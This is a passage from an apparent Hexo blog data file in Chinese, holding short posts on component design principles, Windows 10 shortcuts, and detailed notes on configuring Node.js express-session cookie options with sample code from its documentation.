适用开放封闭原则<br>3 追求短小精悍<br>4 避免太多参数<br>5 缩小信赖范围和想稳定方向的信赖<br>6 追求无副作用<br>7 追求透明化<br>8 入口处检查参数的有效性，出口处检查返回的正确性<br>9 充分隔离变化的部分</p>\n<p>自省的几个问题<br>组件是否有必要再分<br>组件划分的依据通常是业务逻辑、功能、要考虑组件之间的关系是否明确<br>划分粒度的大小需要根据实际情况权衡，大小会提升维护成本，太大又不够灵活和高复用性<br>每一个组件都应该有起独特的划分目的，有的是为了复用实现，有的是为了封装的复杂度清晰业务实现</p>\n<p>2 组件的依赖是否可以再缩减<br>3 组件的可复用于其他类似场景中<br>在考虑需要适用的不同场景，在组件接口设计时需要兼容<br>4 组件当别人使用时，会怎么想<br>5 假如业务需要不需要这个功能，是否清楚方便</p>\n<h3 id=\"敲代码的李二狗\"><a href=\"#敲代码的李二狗\" class=\"headerlink\" title=\"敲代码的李二狗:\"></a>敲代码的李二狗:</h3><p><a href=\"https://kb.cnblogs.com/page/606682/\" target=\"_blank\" rel=\"noopener\">为什么说 Java 程序员必须掌握 Spring Boot ？</a></p>\n"},{"title":"Windows/系统快捷键","date":"2018-05-05T01:46:01.000Z","archives":"系统快捷键","_content":"# Windows/系统快捷键\n\n## Win10\n> Win + G  // XBOX录屏软件\n\n> Win + shift + 1~9  // 快速建立新窗口/多窗口\n\n> Win + `\"+\"` // 屏幕放大镜\n\n> Win + Esc  // 关闭屏幕放大镜\n","source":"_posts/Operating System/Windows/Windows-系统快捷键.md","raw":"---\ntitle: Windows/系统快捷键\ndate: 2018-05-05 09:46:01\ntags: Windows/系统快捷键\narchives: 系统快捷键\ncategories: Windows\n---\n# Windows/系统快捷键\n\n## Win10\n> Win + G  // XBOX录屏软件\n\n> Win + shift + 1~9  // 快速建立新窗口/多窗口\n\n> Win + `\"+\"` // 屏幕放大镜\n\n> Win + Esc  // 关闭屏幕放大镜\n","slug":"Operating System/Windows/Windows-系统快捷键","published":1,"updated":"2018-09-05T06:33:18.504Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0f00b0zodvw5qpxxij","content":"<h1 id=\"Windows-系统快捷键\"><a href=\"#Windows-系统快捷键\" class=\"headerlink\" title=\"Windows/系统快捷键\"></a>Windows/系统快捷键</h1><h2 id=\"Win10\"><a href=\"#Win10\" class=\"headerlink\" title=\"Win10\"></a>Win10</h2><blockquote>\n<p>Win + G  // XBOX录屏软件</p>\n<p>Win + shift + 1~9  // 快速建立新窗口/多窗口</p>\n<p>Win + <code>&quot;+&quot;</code> // 屏幕放大镜</p>\n<p>Win + Esc  // 关闭屏幕放大镜</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Windows-系统快捷键\"><a href=\"#Windows-系统快捷键\" class=\"headerlink\" title=\"Windows/系统快捷键\"></a>Windows/系统快捷键</h1><h2 id=\"Win10\"><a href=\"#Win10\" class=\"headerlink\" title=\"Win10\"></a>Win10</h2><blockquote>\n<p>Win + G  // XBOX录屏软件</p>\n<p>Win + shift + 1~9  // 快速建立新窗口/多窗口</p>\n<p>Win + <code>&quot;+&quot;</code> // 屏幕放大镜</p>\n<p>Win + Esc  // 关闭屏幕放大镜</p>\n</blockquote>\n"},{"title":"Express-session","date":"2018-07-13T08:41:14.000Z","_content":"## [Express-session](https://blog.csdn.net/hsany330/article/details/51968594)\n````\napp.use(cookieParser());\napp.use(session({\n  secret: '12345',\n  name: 'name',\n  cookie: {maxAge: 60000},\n  resave: false,\n  saveUninitialized: true,\n}));\n````\n\n各参数意义：\n\n`secret`：用来对session数据进行加密的字符串.这个属性值为必须指定的属性。\n\n`name`：表示cookie的name，默认cookie的name是：connect.sid。\n\n`maxAge`：cookie过期时间，毫秒。\n`resave`：是指每次请求都重新设置session cookie，假设你的cookie是6000毫秒过期，每次请求都会再设置6000毫秒。\n\n`saveUninitialized`：是指无论有没有session cookie，每次请求都设置个session cookie ，默认给个标示为 connect.sid。\n\n之后在处理请求时直接通过以下方式对session进行读写：\n\n---\n\n## [Cookie的特性](http://zhou.jie.ge.blog.163.com/blog/static/118519146201043131050363/)\n  每个Cookie包含有6个元素,常用的有:name、value、expires、d\nomain和secure。这些元素存放了这个Cookie的作用范围及实际的数\n据。\n\n---\n\n## [理解cookie的path和domain属性](http://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html)\n\n---\n\n## [Cookie作用域](https://blog.csdn.net/kky2010_110/article/details/4743796)\n\n---\n\n## [NPM express-session](https://www.npmjs.com/package/express-session)\n\n### 选项\nexpress-session 在options对象中接受这些属性。\n\n#### `cookie` 为 session ID cookie的设置对象。默认值为 \n  > { path: '/', httpOnly: true, secure: false, maxAge: null }。\n  \n  - cookie.domain  \n    指定Domain Set-Cookie属性的值。默认情况下，未设置任何域，并且大多数客户端会将cookie视为仅应用于当前域。\n  \n  - cookie.expires  \n    指定Date要作为Expires Set-Cookie属性值的对象。默认情况下，没有设置过期，并且大多数客户端会将此视为“非持久性cookie”，并在退出Web浏览器应用程序的条件下将其删除。\n\n    **注意** 如果在选项中设置了`expires`和`maxAge`，则在对象中定义的最后一个是生效的。  \n\n    **注意** `expires`不应直接设置该选项; 而只是使用该 `maxAge` 选项。\n  \n  - cookie.httpOnly  \n    指定属性的`boolean值``HttpOnly Set-Cookie`。为true时，设置HttpOnly属性，否则不设置。默认情况下，该HttpOnly 属性已设置。  \n\n    **注意** 在将其设置为true时要小心，因为兼容客户端 不允许 客户端JavaScript在`document.cookie`中看到`cookie`。\n  \n  - cookie.maxAge  \n    指定计算`Expires Set-Cookie`属性时 要使用 数字(以毫秒为单位)。这是通过 获取当前服务器时间 并向`值`添加`maxAge`毫秒来计算过期日期时间来完成的。默认情况下，没有设置`maxAge`。\n\n    **注意** 如果在选项中同时设置了`expires`和`maxAge`，那么对象中定义的`最后一个`就是所使用的。\n  \n  - cookie.path  \n    指定的值`Path` `Set-Cookie`。默认情况下，将其设置为`'/'`，即域的根路径。\n  \n  - cookie.sameSite  \n    指定`布尔值`或`字符串`作为`SameSite Set-Cookie`属性的值。  \n    \n    - true会将 SameSite 属性设置为严格执行相同的站点。|| \n        true将 SameSite 属性设置Strict为严格相同的站点实施。\n    - false不会设置 SameSite 属性。\n    - 'lax'将 SameSite 属性设置Lax为`松散`相同的网站实施。\n    - 'strict'将 SameSite 属性设置为`严格`Strict以便严格执行相同的站点。\n\n    [更多关于不同执行级别的信息可以在规范中找到](https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1.1)\n    \n    **注意** 这是一个尚未完全标准化的属性，将来可能会改变。这也意味着许多客户可能会忽略这个属性，直到他们理解认可它。\n\n  - cookie.secure  \n    指定`安全` `设置cookie`属性的布尔值。当truthy时，设置了Secure属性，否则不设置。默认情况下，未设置Secure属性。\n    指定属性的boolean值Secure Set-Cookie。当真实时，设置Secure属性，否则不设置。默认情况下，Secure 未设置该属性。\n\n    **注意** 在设置为true时要小心，因为如果浏览器没有`HTTPS`连接，符合规范(兼容的) 客户端 将来不会将cookie发送回服务器。  \n\n    **请注意!** `secure: true`是 **推荐的** 选项。但是，它需要启用(支持)https的网站，即`secure cookies`需要HTTPS(HTTPS对于安全cookie是必要的)。如果`secure` 已设置，并且您通过HTTP访问您的站点，则不会设置cookie(不生效)。如果你的node.js在代理后面并且正在使用secure: true，你需要在express中设置“trust proxy”：\n    ````\n    var app = express()\n\n    app.set('trust proxy', 1) // trust first proxy\n\n    app.use(session({\n      secret: 'keyboard cat',\n      resave: false,\n      saveUninitialized: true,\n      cookie: { secure: true }\n    }))\n    ````\n    对于在生产中使用 `secure cookies`，但允许在开发中进行测试，下面是一个例子，说明如何在express中基于`NODE_ENV`启用此设置:\n    ````\n    var app = express()\n    var sess = {\n      secret: 'keyboard cat',\n      cookie: {}\n    }\n    \n    if (app.get('env') === 'production') {\n      app.set('trust proxy', 1) // trust first proxy\n      sess.cookie.secure = true // serve secure cookies\n    }\n    \n    app.use(session(sess))\n    ````\n    The `cookie`。安全选项也可以设置为特殊值'auto'，使该设置自动匹配连接的确定安全性。如果站点同时作为HTTP和HTTPS可用，那么在使用此设置时要小心，因为一旦在HTTPS上设置了cookie，它将不再在HTTP上可见。当正确设置Express\"trust proxy\"(“信任代理”)设置以简化开发与生产配置时，这是很有用的。\n  \n  - genid 配置  \n    函数调用以生成一个新的会话ID。提供一个函数，该函数返回一个将用作会话ID的字符串。  \n    默认值是使用`uid-safe`库来生成id的函数。\n\n    **注意请** 注意生成惟一的id，这样会话就不会发生冲突。\n\n    ````\n    app.use(session({\n      genid: function(req) {\n        return genuuid() // use UUIDs for session IDs\n      },\n      secret: 'keyboard cat'\n    }))\n    ````\n  \n  - name  \n    在响应中设置的会话ID cookie的名称(并从请求中读取)。\n    The default value is 'connect.sid'.\n\n    **注意** 如果在相同的主机名上运行多个应用程序(这只是名称，即localhost或127.0.0.1;不同的方案和端口不会命名不同的主机名)，然后需要将session cookie彼此分开。最简单的方法是为每个应用设置不同的名称。\n\n  - proxy  \n    Trust the reverse proxy when setting secure cookies (via the \"X-Forwarded-Proto\" header).  \n\n    在设置安全cookie时（通过 `X-Forwarded-Proto` 标头）信任反向代理。  \n    默认值为undefined。\n\n## \n---\n\n## [node.js 中间件express-session使用详解](https://www.jb51.net/article/114232.htm)\n\n## [同源策略以及cookie安全策略](https://blog.csdn.net/turkeyzhou/article/details/8818173)\n\n","source":"_posts/programmingLanguage/NodeJS/Express-session.md","raw":"---\ntitle: Express-session\ndate: 2018-07-13 16:41:14\ntags: session\ncategories: Node Express-session\n---\n## [Express-session](https://blog.csdn.net/hsany330/article/details/51968594)\n````\napp.use(cookieParser());\napp.use(session({\n  secret: '12345',\n  name: 'name',\n  cookie: {maxAge: 60000},\n  resave: false,\n  saveUninitialized: true,\n}));\n````\n\n各参数意义：\n\n`secret`：用来对session数据进行加密的字符串.这个属性值为必须指定的属性。\n\n`name`：表示cookie的name，默认cookie的name是：connect.sid。\n\n`maxAge`：cookie过期时间，毫秒。\n`resave`：是指每次请求都重新设置session cookie，假设你的cookie是6000毫秒过期，每次请求都会再设置6000毫秒。\n\n`saveUninitialized`：是指无论有没有session cookie，每次请求都设置个session cookie ，默认给个标示为 connect.sid。\n\n之后在处理请求时直接通过以下方式对session进行读写：\n\n---\n\n## [Cookie的特性](http://zhou.jie.ge.blog.163.com/blog/static/118519146201043131050363/)\n  每个Cookie包含有6个元素,常用的有:name、value、expires、d\nomain和secure。这些元素存放了这个Cookie的作用范围及实际的数\n据。\n\n---\n\n## [理解cookie的path和domain属性](http://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html)\n\n---\n\n## [Cookie作用域](https://blog.csdn.net/kky2010_110/article/details/4743796)\n\n---\n\n## [NPM express-session](https://www.npmjs.com/package/express-session)\n\n### 选项\nexpress-session 在options对象中接受这些属性。\n\n#### `cookie` 为 session ID cookie的设置对象。默认值为 \n  > { path: '/', httpOnly: true, secure: false, maxAge: null }。\n  \n  - cookie.domain  \n    指定Domain Set-Cookie属性的值。默认情况下，未设置任何域，并且大多数客户端会将cookie视为仅应用于当前域。\n  \n  - cookie.expires  \n    指定Date要作为Expires Set-Cookie属性值的对象。默认情况下，没有设置过期，并且大多数客户端会将此视为“非持久性cookie”，并在退出Web浏览器应用程序的条件下将其删除。\n\n    **注意** 如果在选项中设置了`expires`和`maxAge`，则在对象中定义的最后一个是生效的。  \n\n    **注意** `expires`不应直接设置该选项; 而只是使用该 `maxAge` 选项。\n  \n  - cookie.httpOnly  \n    指定属性的`boolean值``HttpOnly Set-Cookie`。为true时，设置HttpOnly属性，否则不设置。默认情况下，该HttpOnly 属性已设置。  \n\n    **注意** 在将其设置为true时要小心，因为兼容客户端 不允许 客户端JavaScript在`document.cookie`中看到`cookie`。\n  \n  - cookie.maxAge  \n    指定计算`Expires Set-Cookie`属性时 要使用 数字(以毫秒为单位)。这是通过 获取当前服务器时间 并向`值`添加`maxAge`毫秒来计算过期日期时间来完成的。默认情况下，没有设置`maxAge`。\n\n    **注意** 如果在选项中同时设置了`expires`和`maxAge`，那么对象中定义的`最后一个`就是所使用的。\n  \n  - cookie.path  \n    指定的值`Path` `Set-Cookie`。默认情况下，将其设置为`'/'`，即域的根路径。\n  \n  - cookie.sameSite  \n    指定`布尔值`或`字符串`作为`SameSite Set-Cookie`属性的值。  \n    \n    - true会将 SameSite 属性设置为严格执行相同的站点。|| \n        true将 SameSite 属性设置Strict为严格相同的站点实施。\n    - false不会设置 SameSite 属性。\n    - 'lax'将 SameSite 属性设置Lax为`松散`相同的网站实施。\n    - 'strict'将 SameSite 属性设置为`严格`Strict以便严格执行相同的站点。\n\n    [更多关于不同执行级别的信息可以在规范中找到](https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1.1)\n    \n    **注意** 这是一个尚未完全标准化的属性，将来可能会改变。这也意味着许多客户可能会忽略这个属性，直到他们理解认可它。\n\n  - cookie.secure  \n    指定`安全` `设置cookie`属性的布尔值。当truthy时，设置了Secure属性，否则不设置。默认情况下，未设置Secure属性。\n    指定属性的boolean值Secure Set-Cookie。当真实时，设置Secure属性，否则不设置。默认情况下，Secure 未设置该属性。\n\n    **注意** 在设置为true时要小心，因为如果浏览器没有`HTTPS`连接，符合规范(兼容的) 客户端 将来不会将cookie发送回服务器。  \n\n    **请注意!** `secure: true`是 **推荐的** 选项。但是，它需要启用(支持)https的网站，即`secure cookies`需要HTTPS(HTTPS对于安全cookie是必要的)。如果`secure` 已设置，并且您通过HTTP访问您的站点，则不会设置cookie(不生效)。如果你的node.js在代理后面并且正在使用secure: true，你需要在express中设置“trust proxy”：\n    ````\n    var app = express()\n\n    app.set('trust proxy', 1) // trust first proxy\n\n    app.use(session({\n      secret: 'keyboard cat',\n      resave: false,\n      saveUninitialized: true,\n      cookie: { secure: true }\n    }))\n    ````\n    对于在生产中使用 `secure cookies`，但允许在开发中进行测试，下面是一个例子，说明如何在express中基于`NODE_ENV`启用此设置:\n    ````\n    var app = express()\n    var sess = {\n      secret: 'keyboard cat',\n      cookie: {}\n    }\n    \n    if (app.get('env') === 'production') {\n      app.set('trust proxy', 1) // trust first proxy\n      sess.cookie.secure = true // serve secure cookies\n    }\n    \n    app.use(session(sess))\n    ````\n    The `cookie`。安全选项也可以设置为特殊值'auto'，使该设置自动匹配连接的确定安全性。如果站点同时作为HTTP和HTTPS可用，那么在使用此设置时要小心，因为一旦在HTTPS上设置了cookie，它将不再在HTTP上可见。当正确设置Express\"trust proxy\"(“信任代理”)设置以简化开发与生产配置时，这是很有用的。\n  \n  - genid 配置  \n    函数调用以生成一个新的会话ID。提供一个函数，该函数返回一个将用作会话ID的字符串。  \n    默认值是使用`uid-safe`库来生成id的函数。\n\n    **注意请** 注意生成惟一的id，这样会话就不会发生冲突。\n\n    ````\n    app.use(session({\n      genid: function(req) {\n        return genuuid() // use UUIDs for session IDs\n      },\n      secret: 'keyboard cat'\n    }))\n    ````\n  \n  - name  \n    在响应中设置的会话ID cookie的名称(并从请求中读取)。\n    The default value is 'connect.sid'.\n\n    **注意** 如果在相同的主机名上运行多个应用程序(这只是名称，即localhost或127.0.0.1;不同的方案和端口不会命名不同的主机名)，然后需要将session cookie彼此分开。最简单的方法是为每个应用设置不同的名称。\n\n  - proxy  \n    Trust the reverse proxy when setting secure cookies (via the \"X-Forwarded-Proto\" header).  \n\n    在设置安全cookie时（通过 `X-Forwarded-Proto` 标头）信任反向代理。  \n    默认值为undefined。\n\n## \n---\n\n## [node.js 中间件express-session使用详解](https://www.jb51.net/article/114232.htm)\n\n## [同源策略以及cookie安全策略](https://blog.csdn.net/turkeyzhou/article/details/8818173)\n\n","slug":"programmingLanguage/NodeJS/Express-session","published":1,"updated":"2018-09-05T06:33:18.493Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0i00b3zodvzfwe6evw","content":"<h2 id=\"Express-session\"><a href=\"#Express-session\" class=\"headerlink\" title=\"Express-session\"></a><a href=\"https://blog.csdn.net/hsany330/article/details/51968594\" target=\"_blank\" rel=\"noopener\">Express-session</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.use(cookieParser());</span><br><span class=\"line\">app.use(session(&#123;</span><br><span class=\"line\">  secret: &apos;12345&apos;,</span><br><span class=\"line\">  name: &apos;name&apos;,</span><br><span class=\"line\">  cookie: &#123;maxAge: 60000&#125;,</span><br><span class=\"line\">  resave: false,</span><br><span class=\"line\">  saveUninitialized: true,</span><br><span class=\"line\">&#125;));</span><br></pre></td></tr></table></figure>\n<p>各参数意义：</p>\n<p><code>secret</code>：用来对session数据进行加密的字符串.这个属性值为必须指定的属性。</p>\n<p><code>name</code>：表示cookie的name，默认cookie的name是：connect.sid。</p>\n<p><code>maxAge</code>：cookie过期时间，毫秒。<br><code>resave</code>：是指每次请求都重新设置session cookie，假设你的cookie是6000毫秒过期，每次请求都会再设置6000毫秒。</p>\n<p><code>saveUninitialized</code>：是指无论有没有session cookie，每次请求都设置个session cookie ，默认给个标示为 connect.sid。</p>\n<p>之后在处理请求时直接通过以下方式对session进行读写：</p>\n<hr>\n<h2 id=\"Cookie的特性\"><a href=\"#Cookie的特性\" class=\"headerlink\" title=\"Cookie的特性\"></a><a href=\"http://zhou.jie.ge.blog.163.com/blog/static/118519146201043131050363/\" target=\"_blank\" rel=\"noopener\">Cookie的特性</a></h2><p>  每个Cookie包含有6个元素,常用的有:name、value、expires、d<br>omain和secure。这些元素存放了这个Cookie的作用范围及实际的数<br>据。</p>\n<hr>\n<h2 id=\"理解cookie的path和domain属性\"><a href=\"#理解cookie的path和domain属性\" class=\"headerlink\" title=\"理解cookie的path和domain属性\"></a><a href=\"http://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html\" target=\"_blank\" rel=\"noopener\">理解cookie的path和domain属性</a></h2><hr>\n<h2 id=\"Cookie作用域\"><a href=\"#Cookie作用域\" class=\"headerlink\" title=\"Cookie作用域\"></a><a href=\"https://blog.csdn.net/kky2010_110/article/details/4743796\" target=\"_blank\" rel=\"noopener\">Cookie作用域</a></h2><hr>\n<h2 id=\"NPM-express-session\"><a href=\"#NPM-express-session\" class=\"headerlink\" title=\"NPM express-session\"></a><a href=\"https://www.npmjs.com/package/express-session\" target=\"_blank\" rel=\"noopener\">NPM express-session</a></h2><h3 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"选项\"></a>选项</h3><p>express-session 在options对象中接受这些属性。</p>\n<h4 id=\"cookie-为-session-ID-cookie的设置对象。默认值为\"><a href=\"#cookie-为-session-ID-cookie的设置对象。默认值为\" class=\"headerlink\" title=\"cookie 为 session ID cookie的设置对象。默认值为\"></a><code>cookie</code> 为 session ID cookie的设置对象。默认值为</h4><blockquote>\n<p>{ path: ‘/‘, httpOnly: true, secure: false, maxAge: null }。</p>\n</blockquote>\n<ul>\n<li><p>cookie.domain<br>指定Domain Set-Cookie属性的值。默认情况下，未设置任何域，并且大多数客户端会将cookie视为仅应用于当前域。</p>\n</li>\n<li><p>cookie.expires<br>指定Date要作为Expires Set-Cookie属性值的对象。默认情况下，没有设置过期，并且大多数客户端会将此视为“非持久性cookie”，并在退出Web浏览器应用程序的条件下将其删除。</p>\n<p><strong>注意</strong> 如果在选项中设置了<code>expires</code>和<code>maxAge</code>，则在对象中定义的最后一个是生效的。  </p>\n<p><strong>注意</strong> <code>expires</code>不应直接设置该选项; 而只是使用该 <code>maxAge</code> 选项。</p>\n</li>\n<li><p>cookie.httpOnly<br>指定属性的<code>boolean值``HttpOnly Set-Cookie</code>。为true时，设置HttpOnly属性，否则不设置。默认情况下，该HttpOnly 属性已设置。  </p>\n<p><strong>注意</strong> 在将其设置为true时要小心，因为兼容客户端 不允许 客户端JavaScript在<code>document.cookie</code>中看到<code>cookie</code>。</p>\n</li>\n<li><p>cookie.maxAge<br>指定计算<code>Expires Set-Cookie</code>属性时 要使用 数字(以毫秒为单位)。这是通过 获取当前服务器时间 并向<code>值</code>添加<code>maxAge</code>毫秒来计算过期日期时间来完成的。默认情况下，没有设置<code>maxAge</code>。</p>\n<p><strong>注意</strong> 如果在选项中同时设置了<code>expires</code>和<code>maxAge</code>，那么对象中定义的<code>最后一个</code>就是所使用的。</p>\n</li>\n<li><p>cookie.path<br>指定的值<code>Path</code> <code>Set-Cookie</code>。默认情况下，将其设置为<code>&#39;/&#39;</code>，即域的根路径。</p>\n</li>\n<li><p>cookie.sameSite<br>指定<code>布尔值</code>或<code>字符串</code>作为<code>SameSite Set-Cookie</code>属性的值。  </p>\n<ul>\n<li>true会将 SameSite 属性设置为严格执行相同的站点。||<br>  true将 SameSite 属性设置Strict为严格相同的站点实施。</li>\n<li>false不会设置 SameSite 属性。</li>\n<li>‘lax’将 SameSite 属性设置Lax为<code>松散</code>相同的网站实施。</li>\n<li>‘strict’将 SameSite 属性设置为<code>严格</code>Strict以便严格执行相同的站点。</li>\n</ul>\n<p><a href=\"https://tools.ietf.org/html/draft-west-first-party-cookies-07#section-4.1.1\" target=\"_blank\" rel=\"noopener\">更多关于不同执行级别的信息可以在规范中找到</a></p>\n<p><strong>注意</strong> 这是一个尚未完全标准化的属性，将来可能会改变。这也意味着许多客户可能会忽略这个属性，直到他们理解认可它。</p>\n</li>\n<li><p>cookie.secure<br>指定<code>安全</code> <code>设置cookie</code>属性的布尔值。当truthy时，设置了Secure属性，否则不设置。默认情况下，未设置Secure属性。<br>指定属性的boolean值Secure Set-Cookie。当真实时，设置Secure属性，否则不设置。默认情况下，Secure 未设置该属性。</p>\n<p><strong>注意</strong> 在设置为true时要小心，因为如果浏览器没有<code>HTTPS</code>连接，符合规范(兼容的) 客户端 将来不会将cookie发送回服务器。  </p>\n<p><strong>请注意!</strong> <code>secure: true</code>是 <strong>推荐的</strong> 选项。但是，它需要启用(支持)https的网站，即<code>secure cookies</code>需要HTTPS(HTTPS对于安全cookie是必要的)。如果<code>secure</code> 已设置，并且您通过HTTP访问您的站点，则不会设置cookie(不生效)。如果你的node.js在代理后面并且正在使用secure: true，你需要在express中设置“trust proxy”：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var app = express()</span><br><span class=\"line\"></span><br><span class=\"line\">app.set(&apos;trust proxy&apos;, 1) // trust first proxy</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(session(&#123;</span><br><span class=\"line\">  secret: &apos;keyboard cat&apos;,</span><br><span class=\"line\">  resave: false,</span><br><span class=\"line\">  saveUninitialized: true,</span><br><span class=\"line\">  cookie: &#123; secure: true &#125;</span><br><span class=\"line\">&#125;))</span><br></pre></td></tr></table></figure>\n<p>对于在生产中使用 <code>secure cookies</code>，但允许在开发中进行测试，下面是一个例子，说明如何在express中基于<code>NODE_ENV</code>启用此设置:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var app = express()</span><br><span class=\"line\">var sess = &#123;</span><br><span class=\"line\">  secret: &apos;keyboard cat&apos;,</span><br><span class=\"line\">  cookie: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (app.get(&apos;env&apos;) === &apos;production&apos;) &#123;</span><br><span class=\"line\">  app.set(&apos;trust proxy&apos;, 1) // trust first proxy</span><br><span class=\"line\">  sess.cookie.secure = true // serve secure cookies</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(session(sess))</span><br></pre></td></tr></table></figure>\n<p>The <code>cookie</code>。安全选项也可以设置为特殊值’auto’，使该设置自动匹配连接的确定安全性。如果站点同时作为HTTP和HTTPS可用，那么在使用此设置时要小心，因为一旦在HTTPS上设置了cookie，它将不再在HTTP上可见。当正确设置Express”trust proxy”(“信任代理”)设置以简化开发与生产配置时，这是很有用的。</p>\n</li>\n<li><p>genid 配置<br>函数调用以生成一个新的会话ID。提供一个函数，该函数返回一个将用作会话ID的字符串。<br>默认值是使用<code>uid-safe</code>库来生成id的函数。</p>\n<p><strong>注意请</strong> 注意生成惟一的id，这样会话就不会发生冲突。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.use(session(&#123;</span><br><span class=\"line\">  genid: function(req) &#123;</span><br><span class=\"line\">    return genuuid() // use UUIDs for session IDs</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  secret: &apos;keyboard cat&apos;</span><br><span class=\"line\">&#125;))</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ul>\n<li><p>name<br>在响应中设置的会话ID cookie的名称(并从请求中读取)。<br>The default value is ‘connect.sid’.</p>\n<p><strong>注意</strong> 如果在相同的主机名上运行多个应用程序(这只是名称，即localhost或127.0.0.1;不同的方案和端口不会命名不同的主机名)，然后需要将session cookie彼此分开。最简单的方法是为每个应用设置不同的名称。</p>\n</li>\n<li><p>proxy<br>Trust the reverse proxy when setting secure cookies (via the “X-Forwarded-Proto” header).  </p>\n<p>在设置安全cookie时（通过 <code>X-Forwarded-Proto</code> 标头）信任反向代理。<br>默认值为undefined。</p>\n</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"## \"></a>## </h2><h2 id=\"node-js-中间件express-session使用详解\"><a href=\"#node-js-中间件express-session使用详解\" class=\"headerlink\" title=\"node.js 中间件express-session使用详解\"></a><a href=\"https://www.jb51.net/article/114232.htm\" target=\"_blank\" rel=\"noopener\">node.js 中间件express-session使用详解</a></h2><h2 id=\"同源策略以及cookie安全策略\"><a href=\"#同源策略以及cookie安全策略\" class=\"headerlink\" title=\"同源策略以及cookie安全策略\"></a><a href=\"https://blog.csdn.net/turkeyzhou/article/details/8818173\" target=\"_blank\" rel=\"noopener\">同源策略以及cookie安全策略</a></h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Express-session\"><a href=\"#Express-session\" class=\"headerlink\" title=\"Express-session\"></a><a href=\"https://blog.csdn.net/hsany330/article/details/51968594\" target=\"_blank\" rel=\"noopener\">Express-session</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.use(cookieParser());</span><br><span class=\"line\">app.use(session(&#123;</span><br><span class=\"line\">  secret: &apos;12345&apos;,</span><br><span class=\"line\">  name: &apos;name&apos;,</span><br><span class=\"line\">  cookie: &#123;maxAge: 60000&#125;,</span><br><span class=\"line\">  resave: false,</span><br><span class=\"line\">  saveUninitialized: true,</span><br><span class=\"line\">&#125;));</span><br></pre></td></tr></table></figure>\n<p>各参数意义：</p>\n<p><code>secret</code>：用来对session数据进行加密的字符串.这个属性值为必须指定的属性。</p>\n<p><code>name</code>：表示cookie的name，默认cookie的name是：connect.sid。</p>\n<p><code>maxAge</code>：cookie过期时间，毫秒。<br><code>resave</code>：是指每次请求都重新设置session cookie，假设你的cookie是6000毫秒过期，每次请求都会再设置6000毫秒。</p>\n<p><code>saveUninitialized</code>：是指无论有没有session cookie，每次请求都设置个session cookie ，默认给个标示为 connect.sid。</p>\n<p>之后在处理请求时直接通过以下方式对session进行读写：</p>\n<hr>\n<h2 id=\"Cookie的特性\"><a href=\"#Cookie的特性\" class=\"headerlink\" title=\"Cookie的特性\"></a><a href=\"http://zhou.jie.ge.blog.163.com/blog/static/118519146201043131050363/\" target=\"_blank\" rel=\"noopener\">Cookie的特性</a></h2><p>  每个Cookie包含有6个元素,常用的有:name、value、expires、d<br>omain和secure。这些元素存放了这个Cookie的作用范围及实际的数<br>据。</p>\n<hr>\n<h2 id=\"理解cookie的path和domain属性\"><a href=\"#理解cookie的path和domain属性\" class=\"headerlink\" title=\"理解cookie的path和domain属性\"></a><a href=\"http://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html\" target=\"_blank\" rel=\"noopener\">理解cookie的path和domain属性</a></h2><hr>\n<h2 id=\"Cookie作用域\"><a href=\"#Cookie作用域\" class=\"headerlink\" title=\"Cookie作用域\"></a><a href=\"https://blog.csdn.net/kky2010_110/article/details/4743796\" target=\"_blank\" rel=\"noopener\">Cookie作用域</a></h2><hr>\n<h2 id=\"NPM-express-session\"><a href=\"#NPM-express-session\" class=\"headerlink\" title=\"NPM express-session\"></a><a href=\"https://www.npmjs.com/package/express-session\" target=\"_blank\" rel=\"noopener\">NPM express-session</a></h2><h3 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" 